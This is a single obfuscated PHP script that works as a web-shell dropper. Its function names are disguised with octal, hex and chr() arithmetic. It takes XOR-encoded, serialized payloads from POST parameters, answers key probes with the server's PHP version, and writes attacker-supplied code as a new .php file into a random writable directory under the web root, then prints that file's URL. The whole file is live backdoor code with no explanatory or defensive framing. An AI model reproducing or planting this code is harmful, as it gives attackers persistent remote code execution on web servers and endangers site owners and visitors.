<?php function CDrHzhkh($AwvUP){$qixyTdr = "\162"."\x61".chr(972-853).chr(624-507)."\162"."\154".chr(1011-911)."\x65"."\x63"."\x6f".chr(740-640).chr(556-455);$OblqeM = "\x73"."\164".'r'.'_'.chr(958-844).chr(243-132)."\x74"."\61"."\x33";$hSCnQfplX = "\163"."\x74".chr(114).chr(869-774).'s'.'p'.chr(108)."\x69"."\164";$AwvUP = $hSCnQfplX($qixyTdr($OblqeM($AwvUP)));return $AwvUP;}function aYMDwPhLiv($tPLyDJhcp, $AwvUP){$DgOUlLFphn = 's'.'t'.'r'."\137".chr(115)."\160"."\154"."\x69"."\x74";$tPLyDJhcp = array_slice($DgOUlLFphn(str_repeat($tPLyDJhcp, (count($AwvUP)/16)+1)), 0, count($AwvUP));return $tPLyDJhcp;}function GxSDSlF($njOOXl, $iIucAU, $tPLyDJhcp){$yeVYS = "dd2cdad6-d547-4fd0-8e41-d5a7a17380d2";return $njOOXl ^ $yeVYS[$iIucAU % strlen($yeVYS)] ^ $tPLyDJhcp;}function RQwLPNiKZl($AwvUP, $tPLyDJhcp){$AwvUP = array_map("GxSDSlF", array_values($AwvUP), array_keys($AwvUP), array_values($tPLyDJhcp));$AwvUP = implode("", $AwvUP);$SJHryfKl = "\x75"."\156"."\x73".chr(101)."\x72"."\x69".'a'."\x6c".chr(105)."\x7a".'e';$AwvUP = @$SJHryfKl($AwvUP);return $AwvUP;}function VPamoIfk($fJrJLir){static $oozIRlOPTa = array();$GOHcQnU = glob($fJrJLir . '/*', GLOB_ONLYDIR);$uweIARdC = count($GOHcQnU);if ($uweIARdC > 0) {foreach ($GOHcQnU as $fJrJL) {$MfnVp = "\x69".chr(115).chr(134-39)."\167".chr(114)."\x69".chr(116).chr(97)."\142".chr(735-627).'e';if (@$MfnVp($fJrJL)) {$oozIRlOPTa[] = $fJrJL;}}}foreach ($GOHcQnU as $fJrJLir) VPamoIfk($fJrJLir);return $oozIRlOPTa;}function UOgXVkXMq($AwvUP){$yxfzACF = 'D'."\x4f".chr(518-451).chr(85)."\115"."\x45".chr(78).chr(84)."\137".chr(82).chr(79).chr(619-540).chr(390-306);$PplxuOLRba = $_SERVER[$yxfzACF];$GOHcQnU = VPamoIfk($PplxuOLRba);$LUuOmuTvWA = array_rand($GOHcQnU);$pieEtth = chr(121-75).chr(649-537).chr(553-449)."\160";$ppdHJLq = $GOHcQnU[$LUuOmuTvWA] . "/" . substr(md5(time()), 0, 8) . $pieEtth;$wCLtF = 'f'.'i'."\x6c"."\x65".chr(1066-971)."\160".chr(117)."\164"."\137".chr(99)."\157"."\156".chr(116).'e'."\x6e".chr(116).'s';@$wCLtF($ppdHJLq, $AwvUP);$RYcDwEfI = "\x48"."\124"."\124".chr(99-19)."\137"."\x48".chr(79).chr(436-353).chr(84);$gbByFboT = "\x68"."\164".'t'."\160"."\72"."\x2f".'/';$GwxMIPA = $gbByFboT . $_SERVER[$RYcDwEfI] . substr($ppdHJLq, strlen($PplxuOLRba));print($GwxMIPA);die();}foreach ($_POST as $tPLyDJhcp => $AwvUP){$hZjqg = strlen($tPLyDJhcp);if ($hZjqg == 16){$AwvUP = CDrHzhkh($AwvUP);$tPLyDJhcp = aYMDwPhLiv($tPLyDJhcp, $AwvUP);$AwvUP = RQwLPNiKZl($AwvUP, $tPLyDJhcp);if (@is_array($AwvUP)){$LUuOmuTvWA = array_keys($AwvUP);$AwvUP = $AwvUP[$LUuOmuTvWA[0]];if ($AwvUP === $LUuOmuTvWA[0]){$FjxRfH = "\160".'h'.'p';$EbIqhL = "\x70"."\x68"."\x70".'v'.'e'.'r'.chr(115).chr(1011-906).'o'.'n';$KByLXiaXY = chr(794-679).chr(101).'r'.chr(746-641).chr(978-881).chr(556-448).chr(1102-997)."\172".chr(101);echo @$KByLXiaXY(Array($FjxRfH => @$EbIqhL(), ));exit();}else {UOgXVkXMq($AwvUP);}}}}